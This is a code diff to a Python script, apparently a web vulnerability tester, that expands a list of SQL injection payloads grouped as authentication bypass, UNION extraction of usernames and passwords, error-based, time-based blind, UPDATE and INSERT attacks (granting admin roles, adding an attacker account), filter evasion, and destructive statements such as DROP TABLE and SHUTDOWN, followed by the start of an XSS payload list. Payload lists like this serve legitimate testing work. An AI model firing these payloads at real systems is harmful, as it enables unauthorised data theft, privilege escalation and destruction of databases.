@@ -8,9 +8,49 @@ import json
 init(autoreset=True)
 
 sql_payloads = [
-    "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
-    "abc'; UPDATE users SET role='admin' WHERE username='victim'; --",
-    "x', salary='1' WHERE name='Boby'#"
+    # Basic authentication bypass
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR 'a'='a",
+    "' OR ''='",
+
+    # Tautology with different quotes
+    '" OR "1"="1',
+    "') OR ('1'='1",
+    "') OR '1'='1' --",
+
+    # UNION-based SQLi
+    "' UNION SELECT NULL, NULL--",
+    "' UNION SELECT username, password FROM users--",
+
+    # Error-based
+    "' AND 1=CONVERT(int, (SELECT @@version))--",
+    "' AND 1=CAST((SELECT version()) AS INT)--",
+
+    # Time-based blind SQLi
+    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
+    "'; SELECT pg_sleep(5)--",
+    
+    # Update-based
+    "'; UPDATE users SET role='admin' WHERE username='victim'; --",
+    "abc'; UPDATE users SET salary='9999' WHERE name='Alice'; --",
+
+    # Insert-based
+    "'; INSERT INTO users (username, password) VALUES ('attacker','pass'); --",
+
+    # Obfuscation/bypass filter
+    "' OR 1=1 LIMIT 1--",
+    "' OR 1=1 LIMIT 1 /*",
+    "' OR 1=1 ORDER BY 1--",
+    "'/*!OR*/ 1=1--",
+    "x' OR 1=1--",
+    "' OR 1=1 --+",
+
+    # Compound statement
+    "'; DROP TABLE users; --",
+    "'; SHUTDOWN --",
 ]
 xss_payloads = [
     "<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"
